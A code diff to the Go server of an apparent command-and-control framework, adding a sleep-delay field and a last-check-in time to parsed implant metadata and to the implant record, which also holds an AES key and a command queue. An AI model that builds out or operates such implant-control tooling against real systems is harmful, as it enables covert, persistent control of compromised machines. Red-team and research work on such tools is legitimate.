@@ -6,6 +6,7 @@ import (
 	"github.com/gin-gonic/gin"
 	"github.com/gorilla/websocket"
 	"net/http"
+	"time"
 )
 
 /*
@@ -48,14 +49,16 @@ type (
 		Elevated            uint32
 		Os_info             [5]uint32
 		Os_arch             uint32
+		Sleep_delay         uint32
 	}
 
 	Implant struct {
-		AESKey  []byte
-		IV      []byte
-		Alive   bool
-		Context ImplantContext
-		CmdQue  Queue
+		AESKey      []byte
+		IV          []byte
+		Alive       bool
+		Context     ImplantContext
+		CmdQue      Queue
+		LastCheckin time.Time
 	}
 
 	Package struct {
@@ -248,7 +251,7 @@ func (p *Package) UnmarshalEncryptedMetaData(data []byte) error {
 	        //not included currently [ Base Address ] 8 bytes
 	        [ OS Info      ] ( 5 * 4 ) bytes
 	        [ OS Arch      ] 4 bytes
-	        //not included currently [ SleepDelay   ] 4 bytes
+	        [ SleepDelay   ] 4 bytes
 	        //not included currently [ SleepJitter  ] 4 bytes
 	        //not included currently [ Killdate     ] 8 bytes
 	        //not included currently [ WorkingHours ] 4 bytes
@@ -276,7 +279,7 @@ func (c *ImplantContext) UnmarshalContext(data []byte) {
 	c.Os_info[3] = binary.BigEndian.Uint32(data[52+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length : 56+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length])
 	c.Os_info[4] = binary.BigEndian.Uint32(data[56+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length : 60+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length])
 	c.Os_arch = binary.BigEndian.Uint32(data[60+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length : 64+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length])
-
+	c.Sleep_delay = binary.BigEndian.Uint32(data[64+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length : 68+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length])
 }
 
 func (q *Queue) PreemptQueue(value interface{}) {
